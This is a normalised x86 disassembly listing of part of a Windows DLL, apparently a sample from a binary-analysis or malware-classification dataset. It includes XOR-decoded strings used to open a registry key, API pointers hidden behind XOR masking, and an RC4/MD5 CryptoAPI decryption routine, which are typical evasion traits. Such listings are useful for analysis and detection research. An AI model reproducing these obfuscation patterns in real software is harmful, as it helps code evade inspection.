push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_1007f580
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_1007f580
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x34 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x34 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_1007f580
add esp 0xc
lea eax [ ebp - 0x34 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_1007f580
add esp 0xc
push r--data
call esi
lea edx [ ebp - 0x20 ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_1007f580
add esp 0xc
lea edx [ ebp - 0x20 ]
push edx
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10044cc0
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ eax + 0x128 ]
test esi esi
jne r-xdata
push edi
lea edi [ eax + 0x130 ]
lea edx [ ebp - 0x38 ]
mov eax 0x133
call sub_1002f620
lea eax [ esi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
push edi
push esi
call sub_10048430
mov esi [ esi + 0x4 ]
add esp 0x8
test esi esi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
sub_10044d2b
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
push ebx
push 0x1
push r--data
push ebx
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] 0x3e8
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp [ ebp + 0x10 ] ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push ebx
push ebx
push 0x8003
push [ ebp - 0x4 ]
call [ CryptCreateHash@IAT ]
test eax eax
je r-xdata
push 0x4
push [ esi ]
mov [ ebp + 0x10 ] ebx
lea ebx [ ebp + 0x10 ]
call sub_1004edb0
pop ecx
pop ecx
push [ ebp + 0x10 ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
push [ ebp + 0x10 ]
mov ebx eax
mov eax [ esi ]
add eax 0x4
push eax
call sub_1004edb0
mov eax [ ebp + 0x10 ]
pop ecx
pop ecx
lea ecx [ ebp - 0x10 ]
push ecx
push 0x0
push 0x0
push eax
push ebx
push [ ebp - 0x4 ]
lea edi [ eax + 0x4 ]
call [ CryptImportKey@IAT ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea eax [ ebp - 0x4 ]
push eax
call sub_10020fb2
jmp r-xdata
pop edi
pop esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0xc ]
call [ CryptHashData@IAT ]
test eax eax
je r-xdata
xor ebx ebx
test ebx ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
push [ ebp - 0xc ]
call [ CryptDestroyHash@IAT ]
mov [ ebp - 0xc ] ebx
lea eax [ ebp - 0x10 ]
push eax
push 0x800000
push [ ebp - 0xc ]
push 0x6801
push [ ebp - 0x4 ]
call [ CryptDeriveKey@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ebx [ esi ]
sub eax edi
push eax
lea eax [ ebx + edi ]
push eax
call sub_1004edb0
mov eax [ ebp + 0xc ]
sub [ eax ] edi
pop ecx
pop ecx
xor ebx ebx
jmp r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
push [ ebp - 0x10 ]
call [ CryptDestroyKey@IAT ]
push 0x3e8
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0x4 ]
call [ CryptReleaseContext@IAT ]
mov [ ebp + 0x13 ] bl
mov [ ebp + 0x14 ] ebx
mov [ ebp + 0x8 ] ebx
mov eax [ esi ]
add eax [ ebp + 0x8 ]
push [ ebp - 0x8 ]
mov ebx edi
push eax
call sub_1004edb0
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
movzx eax [ ebp + 0x13 ]
push edi
push 0x0
push eax
push 0x0
push [ ebp - 0x10 ]
call [ CryptDecrypt@IAT ]
test eax eax
je r-xdata
mov [ ebp + 0x13 ] 0x1
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push [ ebp - 0x14 ]
mov ebx [ esi ]
add ebx [ ebp + 0x8 ]
push edi
call sub_1004edb0
push [ ebp - 0x8 ]
mov ebx edi
call sub_1001e790
add esp 0xc
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
inc [ ebp + 0x14 ]
add [ ebp + 0x8 ] 0x3e8
jmp r-xdata
mov ecx [ ebp + 0x14 ]
imul ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax ]
sub eax ecx
cmp eax [ ebp - 0x8 ]
ja r-xdata
sub_10044f60
push ebp
mov ebp esp
push 0xffffffff
push sub_10088a56
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
call sub_1003c1d0
lea ebx [ esi + 0x70 ]
mov eax 0x7
xor ecx ecx
xor edx edx
mov [ ebx + 0x14 ] eax
mov [ ebx + 0x10 ] ecx
mov [ ebx ] dx
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
mov [ esi + 0x90 ] ecx
mov [ esi + 0xa8 ] eax
xor eax eax
mov [ esi + 0xa4 ] ecx
mov [ esi + 0x94 ] ax
mov [ ebp - 0x4 ] 0x1
mov edx edi
mov [ esi + 0xb0 ] ecx
mov eax [ edx + 0x30 ]
cmp eax ecx
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x34 ]
mov [ esi + 0xb0 ] eax
push r--data
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
mov [ ebp + 0xc ] ecx
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push 0x60000000
push ebx
call [ ebp + 0xc ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ebx [ ebx ]
mov eax edi
mov edx [ eax + 0x30 ]
mov eax edx
lea ecx [ eax + 0x2 ]
mov [ ebp + 0xc ] ecx
lea ebx [ ebx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push 0x0
push 0x0
push 0x0
push edi
call [ SetFilePointer@IAT ]
mov ebx [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ rw-data ]
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push ebx
mov [ ebp + 0xc ] edx
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push ecx
push edi
call [ ebp + 0xc ]
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push edi
call [ ebp + 0xc ]
xor eax eax
cmp [ ebp - 0x10 ] ebx
sete al
mov [ esi + 0x8 ] eax
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0xc ]
lea ecx [ esi + 0x94 ]
sar eax 0x1
push eax
push edx
call sub_10034100
jmp r-xdata
mov ecx esi
call sub_100542e0
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
sub_100450f0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi ecx
xor ecx ecx
mov ebx edx
mov [ ebp - 0x28 ] ebx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi ] r--data
mov [ esi + 0xc ] eax
cmp edi ecx
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x12
call sub_1002f620
mov eax ecx
cmp eax ecx
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0xaa
call sub_1002f620
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea ecx [ ebx + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push ebx
push edi
push eax
mov [ esi + 0x4 ] eax
call sub_1007f580
mov ebx [ ebp - 0x28 ]
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] 0x0
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea edx [ edi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x8 ] eax
call sub_1007f580
add esp 0xc
pop edi
mov eax esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] 0x0
test ebx ebx
je r-xdata
sub_100451e0
push ebp
mov ebp esp
sub esp 0x4a4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ ebp - 0x494 ] eax
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x54
and edx 0xff
mov [ ebp + eax * 2 - 0x84 ] dx
inc eax
cmp eax 0x3f
jb r-xdata
lea ecx [ ebp - 0x490 ]
push ecx
push 0x2011b
xor eax eax
push eax
lea edx [ ebp - 0x84 ]
push edx
push 0x80000002
mov [ ebp - 0x6 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x490 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x498 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push ebx
push edi
lea eax [ ebp - 0x48c ]
push eax
lea ecx [ ebp - 0x28c ]
push ecx
lea edx [ ebp - 0x4a4 ]
push edx
lea eax [ ebp - 0x498 ]
push eax
lea ecx [ ebp - 0x490 ]
push ecx
lea edx [ ebp - 0x494 ]
push edx
lea edi [ ebp - 0x49c ]
lea ebx [ ebp - 0x4a0 ]
call sub_1005e6a0
mov eax [ ebp - 0x490 ]
add esp 0x18
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x490 ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10045308
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x3e
xor edx edx
pop ecx
div ecx
xor esi esi
lea eax [ edx * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
push edi
push esi
push [ ebp - 0x4 ]
mov [ esi ] edi
call [ InterlockedCompareExchange@IAT ]
cmp eax edi
jne r-xdata
push 0xc
call sub_1005f1fb
mov esi eax
pop ecx
test esi esi
je r-xdata
test esi esi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
mov ebx edi
test edi edi
je r-xdata
mov eax [ esi + 0x8 ]
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_10083c4f
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push [ esi + 0x8 ]
call sub_1003744b
push esi
call sub_1001b2d2
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
call sub_1001b2d2
pop ecx
mov [ esi + 0x4 ] ebx
sub_100453c6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
push esi
jne r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_100040e2
movzx esi ax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
add ebx 0x2
call sub_100040e2
add esp 0x10
add edi 0x2
movzx eax ax
test si si
je r-xdata
sub ebx edi
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
cmp si ax
je r-xdata
mov esi eax
cmp eax 0x5a
ja r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
add edi 0x2
test si si
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp eax 0x41
jb r-xdata
movzx eax [ ebx + edi ]
cmp eax 0x41
jb r-xdata
jmp r-xdata
sub_100454c9
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_10004efc
pop ecx
pop ecx
pop ebp
retn
sub_100454f0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x10 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x10 ]
mov [ edx + eax - 0x10 ] r--data
push eax
mov [ eax ] r--data
call sub_10027450
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_1004552c
push 0x4
mov eax sub_10085184
call sub_10026266
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x10 ]
and eax 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ ebp + 0xc ]
and eax 0x8
mov [ ebp + 0x10 ] eax
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_10022420
push esi
push eax
push edi
call sub_1006a134
add esp 0x10
push 0x18
call sub_1002e3ac
pop ecx
cmp eax ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_1004a34e
push esi
push eax
push edi
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
mov ecx eax
call sub_100174a0
mov esi eax
jmp r-xdata
push [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_1003f6e5
push [ ebp + 0x14 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_10015d3b
push [ ebp + 0x14 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_10020009
mov eax [ ebp + 0xc ]
or [ edi + 0x10 ] eax
mov eax [ esi + 0x1c ]
add esp 0x30
cmp eax ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_1001f60e
push esi
push eax
push edi
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push edi
call sub_1006a134
add esp 0xc
jmp r-xdata
push eax
lea ecx [ edi + 0x18 ]
call sub_10024880
mov eax edi
call sub_10008d33
retn
lea eax [ esi + 0x20 ]
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_100575f9
push esi
push eax
push edi
call sub_1006a134
add esp 0x10
push 0x8
call sub_1002e3ac
pop ecx
cmp eax ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push edi
call sub_1006a134
add esp 0xc
jmp r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_10067ab7
push esi
push eax
push edi
call sub_1006a134
add esp 0x10
push 0x18
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x10 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push edi
call sub_1006a134
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push edi
call sub_1006a134
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] r--data
call sub_100668f6
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push edi
call sub_1006a134
add esp 0xc
jmp r-xdata
sub_1004579a
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1004a962
add esp 0x14
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_1005b670
mov [ eax ] ebx
call sub_1004b131
mov eax ebx
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
test esi esi
setg cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_10082c62
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add eax edi
add ecx eax
push ecx
call sub_1000f461
add esp 0x10
test eax eax
je r-xdata
sub_10045880
mov eax [ ecx + 0x4 ]
push esi
mov esi [ ecx ]
sub eax esi
sar eax 0x3
cmp eax 0x1ffffffe
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
inc eax
sar edx 0x3
cmp eax edx
jbe r-xdata
push r--data
call sub_10030594
pop esi
retn
push edi
mov esi edx
shr esi 0x1
mov edi 0x1fffffff
sub edi esi
cmp edi edx
pop edi
jae r-xdata
add edx esi
xor edx edx
jmp r-xdata
push edx
call sub_10033a80
mov edx eax
cmp edx eax
jae r-xdata
sub_100458d0
push ebp
mov ebp esp
sub esp 0xd0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx 0x3
mov [ ebp - 0xd0 ] eax
xor eax eax
mov [ ebp - 0x14 ] cx
mov ecx [ r--data ]
push esi
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0xcc ] eax
lea ebx [ ebx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x6a
and edx 0xff
mov [ ebp + eax * 2 - 0x6c ] dx
inc eax
cmp eax 0x10
jb r-xdata
mov ecx [ edi + 0x1c ]
xor eax eax
mov [ ebp - 0x4c ] ax
mov esi [ ecx ]
lea edx [ ebp - 0xc8 ]
push edx
mov edx [ ebp - 0x14 ]
push r--data
lea eax [ ebp - 0x6c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xc8 ]
jns r-xdata
lea edx [ ebp - 0xc0 ]
mov [ ebp - 0xc0 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x9c
call sub_1002f620
mov esi [ ebx + 0xc ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc0 ]
push edx
push edi
call sub_10007950
test eax eax
jne r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0xc8
jmp r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0x32
call sub_1002f620
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xc0 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x79
call sub_1002f620
mov esi [ ebx + 0x4 ]
mov eax edx
push eax
lea ecx [ ebp - 0xc0 ]
push ecx
push edi
call sub_10007950
test eax eax
je r-xdata
call sub_1002f620
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xc0 ] 0x0
lea edx [ ebp - 0x14 ]
mov eax 0x84
call sub_1002f620
mov esi [ ebx + 0x8 ]
push edx
lea eax [ ebp - 0xc0 ]
push eax
push edi
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x7f
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x119
call sub_1002f620
mov esi [ ebx + 0x10 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xc0 ]
push edx
push edi
call sub_10007950
test eax eax
jne r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0x35
jmp r-xdata
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0xc4 ] eax
lea eax [ ebp - 0xc4 ]
push eax
push 0x0
push 0x80000000
push ecx
call [ VarBstrFromI4@IAT ]
cmp [ ebp - 0xc4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
mov eax 0x10b
call sub_1002f620
mov esi [ ebp - 0xc4 ]
push edx
lea eax [ ebp - 0xc0 ]
push eax
push edi
call sub_10007950
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xc4 ] eax
mov ecx [ ebp - 0xc4 ]
push ecx
call [ SysFreeString@IAT ]
mov edx [ ebp - 0xd0 ]
mov eax [ edx ]
mov ecx [ eax ]
lea edx [ ebp - 0xcc ]
push edx
mov edx [ ebp - 0xc8 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0xcc ]
test eax eax
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x12f
call sub_1002f620
lea edx [ ebp - 0xbc ]
mov eax 0xe7
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xcc ] 0x0
jmp r-xdata
sub_10045b86
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_1002d269
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_1002d269
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_1002d269
and [ eax + 0x90 ] 0x0
jmp sub_10038c8a
sub_10045bd5
push 0x20
mov eax sub_100860c3
call sub_10047689
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_1004327d
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10037cf0
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_10005b50
mov eax edi
call sub_100262c3
retn 0x24
sub_10045c60
push ebp
mov ebp esp
push 0xffffffff
push sub_100865a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0xfffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp ecx 0xffffffff
ja r-xdata
mov esi 0xfffffffe
mov ebx [ ebp + 0xc ]
